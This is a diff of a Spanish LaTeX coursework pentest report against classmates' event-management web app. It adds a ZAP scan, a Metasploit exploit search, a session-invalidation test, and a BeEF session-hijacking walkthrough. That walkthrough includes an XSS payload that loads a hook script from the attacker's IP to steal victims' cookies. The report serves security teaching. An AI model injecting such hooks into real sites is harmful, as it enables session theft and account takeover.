@@ -32,6 +32,22 @@
     \end{titlepage}
     \tableofcontents
     \chapter{Introducción}
+        El objetivo de este documento es analizar la seguridad de un sistema web mediante el uso de herramientas de seguridad y poniendo a prueba los conocimientos adquiridos en la asignatura de Sistemas de Gestión de Seguridad de Sistemas de Información.\\
+
+        Para ello, vamos a atacar el sistema web de unos compañeros de clase que han desarrollado una pagina web para la gestion de eventos.\\
+        \begin{center}
+            \href{https://github.com/ImanolMM/Eventify}{Repositorio proyecto victima}
+        \end{center}
+        
+        Antes de empezar con las pruebas de pentesting, vamos a hacer un analisis de la pagina web usando la herramienta ZAP.
+        ZAP es una herramienta de seguridad que nos permite analizar una pagina web en busca de vulnerabilidades.\\
+        \begin{figure}[H]
+            \centering
+            \includegraphics[width=1\textwidth]{./img/introduccion/1.png}
+            \caption{Analisis de la pagina web con ZAP}
+        \end{figure}
+        Como podemos ver, ZAP nos ha encontrado unas cuantas vulnerabilidades.\\
+        En el sigueinte capitulo vamos a ver como podemos explotar estas vulnerabilidades y que podemos hacer con ellas.
     \chapter{Vulnerabilidades}
         \section{Rotura de control de acceso}
             \subsection{Acceso mediante URL}
@@ -114,7 +130,63 @@
                 \end{figure}
                 Este tipo de ataque es muy peligroso ya que nos permite modificar el contenido de la pagina web y realizar acciones en nombre de la victima.
                 En este caso, hemos modificado el titulo de un evento, pero podriamos haber modificado cualquier otro campo de la pagina web llegando a poder afectar al usuario.
-            \clearpage
+                \clearpage
+            \subsection{Session Hijacking}
+                Session Hijacking es un ataque que consiste en robar la sesion de un usuario para poder acceder a la pagina web en su nombre.
+                En este caso, vamos a realizar un ataque de Session Hijacking para acceder a la pagina web en nombre de un usuario.
+                Para ello, vamos a utilizar la herramienta de BeEF.
+                Beef es una herramienta que mediante XSS nos da control sobre el navegador de la victima.\\
+
+                \textbf{Nota:} Para este ataque es necesario usar XSS el cual se explicara en la seccion 2.3.2.\\
+
+                Para empezar, vamos a iniciar el servidor de BeEF.
+                \begin{center}
+                    \texttt{sudo beef-xss}
+                \end{center}
+                \begin{figure}[H]
+                    \centering
+                    \includegraphics[width=1\textwidth]{./img/vulnerabilidades/2.2/3.1.png}
+                    \caption{Servidor de BeEF}
+                \end{figure}
+                \clearpage
+                Una vez iniciado, vamos a crear un evento en la pagina web y vamos a inyectar el siguiente codigo en el campo 'Titulo':
+                \begin{center}
+                    \texttt{<script src="http://IP:3000/hook.js"></script>}
+                \end{center}
+                Siendo IP la IP de la maquina donde esta corriendo el servidor de BeEF, en mi caso, 192.168.1.69.
+                \begin{figure}[H]
+                    \centering
+                    \includegraphics[width=1\textwidth]{./img/vulnerabilidades/2.2/3.2.png}
+                    \caption{Inyección de codigo}
+                \end{figure}
+                Este codigo nos permite ejecutar codigo en el navegador de la victima.
+                Una vez inyectado, veremos como nos aparece un nuevo cliente en la interfaz de Beef.
+                \begin{figure}[H]
+                    \centering
+                    \includegraphics[width=1\textwidth]{./img/vulnerabilidades/2.2/3.3.png}
+                    \caption{Cliente de Beef}
+                \end{figure}
+                Es desde aqui donde podemos realizar un monton de acciones en el navegador de la victima.
+                En este caso, vamos a realizar un ataque de Session Hijacking.
+                Para ello, vamos a utilizar la opcion 'Get Cookie' que nos permite obtener la cookie de la victima.
+                \begin{figure}[H]
+                    \centering
+                    \includegraphics[width=0.25\textwidth]{./img/vulnerabilidades/2.2/3.4.png}
+                    \caption{Modulos de BeEF}
+                \end{figure}
+                \begin{figure}[H]
+                    \centering
+                    \includegraphics[width=1\textwidth]{./img/vulnerabilidades/2.2/3.5.png}
+                    \caption{Obtención de la cookie}
+                \end{figure}
+                Esto nos devuelve la cookie de la victima la cual podemos usar para iniciar sesion en la pagina web en su nombre.\\
+
+                Cabe mencionar que BeEF es una herramienta muy potente que nos permite realizar un monton de ataques ademas de este.
+                Por ejemplo, podemos redirigir a la victima a una pagina maliciosa para realizar un ataque de tipo Phishing,
+                realizar descargas de archivos maliciosos,
+                realizar fotos mediante la webcam de la victima,
+                etc.
+                \clearpage
         \section{Inyecciones}
             \subsection{SQL Injection}
                 La primera vulnerabilidad que vamos a probar es la de SQL Injection con la intencion de obtener información de la base de datos.
@@ -188,7 +260,7 @@
                 Este tipo de vulnerabilidad es muy peligrosa ya que permite a un atacante ejecutar codigo en el navegador de la victima y realizar acciones en su nombre.
                 Tambien hemos visto que podemos redirigir a la victima a una pagina maliciosa, lo que nos permitiria realizar un ataque de tipo Phishing.
                 Aunque la carga de la imagen no parezca muy peligrosa, esta, en realidad puede darnos informacion como la IP de los usuarios que visitan la pagina ya que para cargar dicha imagen se realiza una peticion al servidor donde esta alojada dejando su IP en el camino.
-                En este caso, hemos visto que podemos llegar incluso a ver la cookie de la victima, lo que nos permitiria hacer un ataque de tipo Session Hijacking.\\
+                En este caso, hemos visto que podemos llegar incluso a ver la cookie de la victima igual que en la seccion 2.2.3. pero de forma manual.
                 \clearpage
         \section{Configuración de seguridad insuficiente}
             \subsection{Fuga de información}
@@ -289,25 +361,80 @@
                 Obviamente, este ataque ha sido muy sencillo ya que se utiliza contraseñas muy debiles pero nos sirve para ver que es posible realizar este tipo de ataques.
                 \clearpage
         \section{Componentes vulnerables y obsoletos}
-            \subsection{Vulnerabilidades mediante MF}
-            \clearpage
+            \subsection{Explotacion mediante Metasploit}
+                Metasploit es un framework que nos permite realizar una infinidad de ataques.
+                En este caso, vamos a utilizar Metasploit para buscar primero exploits que afecten a la version de Apache y de PHP que esta ejecutando el servidor.
+                Para ello, primero, vamos a iniciar metasploit.
+                \begin{center}
+                    \texttt{sudo msfconsole}
+                \end{center}
+                Una vez iniciado, vamos a buscar exploits que afecten a la version de Apache y PHP que esta ejecutando el servidor.
+                \begin{center}
+                    \texttt{search apache 2.4.25}
+                \end{center}
+                \begin{figure}[H]
+                    \centering
+                    \includegraphics[width=0.8\textwidth]{./img/vulnerabilidades/2.5/1.1.png}
+                    \caption{Busqueda de exploits}
+                \end{figure}
+                Ningun resultado encontrado.\\
+                \begin{center}
+                    \texttt{search php 7.2.2}
+                \end{center}
+                \begin{figure}[H]
+                    \centering
+                    \includegraphics[width=0.8\textwidth]{./img/vulnerabilidades/2.5/1.2.png}
+                    \caption{Busqueda de exploits}
+                \end{figure}
+                En este caso, tenemos un resultado que podria afectar a la version de PHP que esta ejecutando el servidor. Por desgracia, este exploit es para Nginx y no para Apache.\\
+                \begin{figure}[H]
+                    \centering
+                    \includegraphics[width=0.8\textwidth]{./img/vulnerabilidades/2.5/1.3.png}
+                    \caption{Información del exploit}
+                \end{figure}
+                Esto nos indica que no hay exploits para la version de Apache y PHP que esta ejecutando el servidor.\\
+                \clearpage
         \section{Fallos de identificación y autenticación}
             \subsection{Invalidación de sesiones}
+                La invalidacion de sesiones es un problema en el que una sesion no se invalida correctamente y permite a un atacante acceder a la pagina web en nombre de un usuario.
+                En este caso, vamos a realizar un ataque de invalidacion de sesiones para acceder a la pagina web en nombre de un usuario.
+                Para ello simplemente vamos a iniciar sesion en la pagina web y vamos a cerrar sesion.
+                Una vez cerrada la sesion, vamos a darle al boton de 'Atras' del navegador para volver a la pagina de inicio.
+                \begin{figure}[H]
+                    \centering
+                    \includegraphics[width=0.7\textwidth]{./img/vulnerabilidades/2.6/1.1.png}
+                    \caption{Inicio de sesion}
+                \end{figure}
+                \begin{figure}[H]
+                    \centering
+                    \includegraphics[width=0.7\textwidth]{./img/vulnerabilidades/2.6/1.2.png}
+                    \caption{Cierre de sesion}
+                \end{figure}
+                \begin{figure}[H]
+                    \centering
+                    \includegraphics[width=0.7\textwidth]{./img/vulnerabilidades/2.6/1.3.png}
+                    \caption{Vuelta Atras}
+                \end{figure}
+                Como podemos ver, al darle al boton de 'Atras' del navegador, volvemos a la pagina de inicio pero con la sesion iniciada.
+                Esto nos permite acceder a la pagina web en nombre de un usuario sin necesidad de iniciar sesion.
+                Este problema es muy peligroso ya que permite a un atacante acceder a la pagina web en nombre de un usuario sin necesidad de conocer su contraseña.
+                Es necesario que la pagina web invalida correctamente las sesiones para evitar este tipo de ataques y que no alamacene informacion en caché.
             \clearpage
     \chapter{Bibliografia}
-    \begin{itemize}
-        \item OWASP. (2021). Informe de Vulnerabilidades. OWASP. \url{https://owasp.org/www-project-top-ten/}
-        \item GPT-3.5. (2023). Respuestas a preguntas varias. OpenAI. \url{https://www.openai.com/}
-        \item GitHub Copilot. (2022). Autocompletado. GitHub. \url{https://github.com/features/copilot}
-        \item sqlmap. (2017). Documentación de sqlmap. sqlmap. \url{https://github.com/sqlmapproject/sqlmap/wiki/}
-        \item ZAP. (2023). Documentación de ZAP. OWASP. \url{https://www.zaproxy.org/docs/}
-        \item metasploit. (2023). Documentación de metasploit. Rapid7. \url{https://docs.rapid7.com/metasploit/}
-        \item nmap. (2020). Documentación de nmap. nmap. \url{https://nmap.org/man/es/}
-        \item cupp. (2020). Documentación de cupp. cupp. \url{https://github.com/Mebus/cupp}
-        \item hydra. (2023). Documentación de hydra. THC. \url{https://github.com/vanhauser-thc/thc-hydra}
-        \item DirBuster. (2023). Documentación de DirBuster. OWASP. \url{https://owasp.org/www-pdf-archive/DirBuster_OWASP-London_September-2008.pdf}
-        \item curl. (2023). Documentación de curl. curl. \url{https://curl.se/docs/}
-        \item Wireshark. (2023). Documentación de Wireshark. Wireshark. \url{https://www.wireshark.org/docs/}
-        \item Burp Suite. (2023). Documentación de Burp Suite. PortSwigger. \url{https://portswigger.net/burp/documentation}
-    \end{itemize}
+        \begin{itemize}
+            \item OWASP. (2021). Informe de Vulnerabilidades. OWASP. \url{https://owasp.org/www-project-top-ten/}
+            \item GPT-3.5. (2023). Respuestas a preguntas varias. OpenAI. \url{https://www.openai.com/}
+            \item GitHub Copilot. (2022). Autocompletado. GitHub. \url{https://github.com/features/copilot}
+            \item sqlmap. (2017). Documentación de sqlmap. sqlmap. \url{https://github.com/sqlmapproject/sqlmap/wiki/}
+            \item ZAP. (2023). Documentación de ZAP. OWASP. \url{https://www.zaproxy.org/docs/}
+            \item metasploit. (2023). Documentación de metasploit. Rapid7. \url{https://docs.rapid7.com/metasploit/}
+            \item nmap. (2020). Documentación de nmap. nmap. \url{https://nmap.org/man/es/}
+            \item cupp. (2020). Documentación de cupp. cupp. \url{https://github.com/Mebus/cupp}
+            \item hydra. (2023). Documentación de hydra. THC. \url{https://github.com/vanhauser-thc/thc-hydra}
+            \item DirBuster. (2023). Documentación de DirBuster. OWASP. \url{https://owasp.org/www-pdf-archive/DirBuster_OWASP-London_September-2008.pdf}
+            \item curl. (2023). Documentación de curl. curl. \url{https://curl.se/docs/}
+            \item Wireshark. (2023). Documentación de Wireshark. Wireshark. \url{https://www.wireshark.org/docs/}
+            \item Burp Suite. (2023). Documentación de Burp Suite. PortSwigger. \url{https://portswigger.net/burp/documentation}
+            \item BeEF. (2023). Documentación de BeEF. BeEF. \url{https://github.com/beefproject/beef/wiki}
+        \end{itemize}
 \end{document}
